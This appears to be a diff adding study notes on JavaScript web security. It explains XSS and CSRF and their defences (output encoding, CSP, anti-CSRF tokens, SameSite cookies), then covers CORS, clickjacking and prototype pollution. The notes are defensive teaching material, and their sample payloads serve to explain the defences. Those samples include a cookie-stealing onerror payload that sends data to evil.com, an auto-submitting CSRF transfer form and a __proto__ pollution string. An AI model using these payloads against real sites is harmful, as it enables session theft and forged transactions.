@@ -1,0 +1,143 @@
+Security in Javascript - XSS, CSRF and friends
+
+=================================================================================================================
+XSS - Cross Site Scripting
+=================================================================================================================
+
+- The attacker gets THEIR javascript to run on YOUR page, in the victim's browser.
+- Once their script runs it has the same rights as your code: it can read the DOM, read
+  localStorage, read non-HttpOnly cookies, and call your API as the logged-in user.
+- Root cause: untrusted data is treated as CODE instead of as TEXT.
+
+Types
+
+	1. Stored (persistent) XSS
+		- The payload is saved in your database and served to everyone.
+		Ex: a comment saved as:  <img src=x onerror="fetch('https://evil.com?c='+document.cookie)">
+		- Worst kind, hits every visitor.
+
+	2. Reflected XSS
+		- The payload comes in the URL/query and is echoed straight back into the page.
+		Ex: /search?q=<script>steal()</script>
+			document.getElementById('out').innerHTML = 'Results for ' + query;
+		- Delivered by tricking the user into clicking a link.
+
+	3. DOM-based XSS
+		- Never touches the server. Client-side JS takes something attacker controlled and writes it
+		  into a dangerous sink.
+		Ex: document.body.innerHTML = location.hash.slice(1);
+
+	Dangerous SINKS to remember:
+		innerHTML, outerHTML, insertAdjacentHTML, document.write
+		eval(), new Function(), setTimeout('string'), setInterval('string')
+		element.setAttribute('onclick', ...), location.href = 'javascript:...'
+		jQuery $(...).html()
+
+Prevention
+
+	1. Escape / encode on OUTPUT, and encode for the right context (HTML body, attribute, URL, JS, CSS).
+	2. Prefer textContent over innerHTML. This alone kills most XSS.
+		Ex: el.textContent = userInput;			// safe, tags are shown as text
+			el.innerHTML  = userInput;			// dangerous
+	3. Sanitise when you genuinely must render HTML (rich text editors) - use DOMPurify, not your own regex.
+		Ex: el.innerHTML = DOMPurify.sanitize(dirtyHtml);
+	4. Never eval() user input. Same for new Function and string-based setTimeout.
+	5. Validate on input as a second layer (allow-list, not block-list) - but output encoding is the real fix.
+	6. Content Security Policy (CSP) header - defence in depth, blocks inline scripts and unknown sources.
+		Ex: Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'
+	7. Set cookies HttpOnly so JS cannot read the session token even if XSS happens.
+	8. Use createElement + setAttribute instead of building HTML strings.
+
+	Framework note (Angular):
+		- Angular escapes interpolation {{ }} automatically and treats values as untrusted by default.
+		- [innerHTML] runs the value through DomSanitizer.
+		- bypassSecurityTrustHtml() turns the protection OFF. Only use it on content you produced.
+		- React equivalent to avoid: dangerouslySetInnerHTML.
+
+=================================================================================================================
+CSRF - Cross Site Request Forgery
+=================================================================================================================
+
+- The attacker makes the victim's BROWSER send a request to your site. The browser automatically
+  attaches the session cookie, so the server thinks the real user did it.
+- Attacker cannot READ the response (same-origin policy blocks that) - this is about ACTIONS, not data theft.
+
+	How it works:
+		1. User logs into bank.com, gets a session cookie.
+		2. User visits evil.com in another tab.
+		3. evil.com contains:
+			<form action="https://bank.com/transfer" method="POST">
+			  <input name="to" value="attacker"><input name="amount" value="10000">
+			</form>
+			<script>document.forms[0].submit();</script>
+		4. Browser sends the request WITH the bank.com cookie. Transfer happens.
+
+Prevention
+
+	1. Anti-CSRF token (synchronizer token pattern) - the main fix
+		- Server puts a random, per-session token in the page.
+		- Client sends it back in a header or hidden field on every state-changing request.
+		- evil.com cannot read the token because of the same-origin policy.
+		Ex: headers: { 'X-CSRF-TOKEN': token }
+
+	2. SameSite cookies
+		Ex: Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Lax
+		- Lax (browser default now): cookie not sent on cross-site POST, but sent on top-level GET navigation.
+		- Strict: never sent cross-site. Safest, but breaks "click a link from email and stay logged in".
+		- None: sent always, REQUIRES Secure. Only for genuine cross-site needs.
+
+	3. Use the right HTTP verbs. GET must never change state. A GET-based delete endpoint is CSRF-able
+	   with just an <img src="...">.
+
+	4. Check Origin / Referer headers on the server for state-changing requests.
+
+	5. Double submit cookie - send the token both as a cookie and as a header, server compares them.
+	   Useful when you have no server-side session store.
+
+	Angular note:
+		- HttpClient has built-in support: it reads the XSRF-TOKEN cookie and sends it as X-XSRF-TOKEN.
+		Ex: provideHttpClient(withXsrfConfiguration({ cookieName: 'XSRF-TOKEN', headerName: 'X-XSRF-TOKEN' }))
+
+	Note: tokens in localStorage + Authorization header are naturally CSRF-safe (the browser does not
+	attach them automatically), but they ARE readable by XSS. Cookies are XSS-safe (HttpOnly) but need
+	CSRF protection. That trade-off is a good thing to say out loud in an interview.
+
+=================================================================================================================
+XSS vs CSRF - the comparison they ask for
+=================================================================================================================
+
+	                | XSS                               | CSRF
+	----------------|-----------------------------------|----------------------------------------
+	What it abuses  | the site's trust in USER INPUT    | the site's trust in the USER'S BROWSER
+	Attacker runs   | script on your page               | no script on your page, just a request
+	Can read data   | yes                               | no, cannot read the response
+	Needs login     | no                                | yes, victim must be logged in
+	Main fix        | output encoding + CSP             | CSRF token + SameSite cookies
+
+=================================================================================================================
+OTHER THINGS WORTH NAMING
+=================================================================================================================
+
+	CORS
+		- Not a protection for your server, it is a browser rule about who may READ a cross-origin response.
+		- Access-Control-Allow-Origin: * on an authenticated API is a mistake.
+		- Preflight OPTIONS request is sent for non-simple methods/headers.
+
+	Clickjacking
+		- Your site is loaded in a transparent iframe over the attacker's page, user clicks blindly.
+		- Fix: X-Frame-Options: DENY  or  CSP frame-ancestors 'none'
+
+	Prototype pollution
+		- Merging untrusted JSON can write to Object.prototype and affect every object in the app.
+		Ex: JSON.parse('{"__proto__": {"isAdmin": true}}')  passed to a naive deep merge
+		- Fix: reject __proto__/constructor/prototype keys, use Object.create(null), freeze prototypes.
+
+	Sensitive data on the client
+		- Anything in the JS bundle is public. No API secrets, no private keys in the frontend.
+		- localStorage is readable by any script on the page.
+
+	Dependencies
+		- npm audit, keep packages updated, watch for typosquatted package names.
+
+	Always: HTTPS everywhere, Secure + HttpOnly cookies, validate on the SERVER
+	(client-side validation is UX, never security).
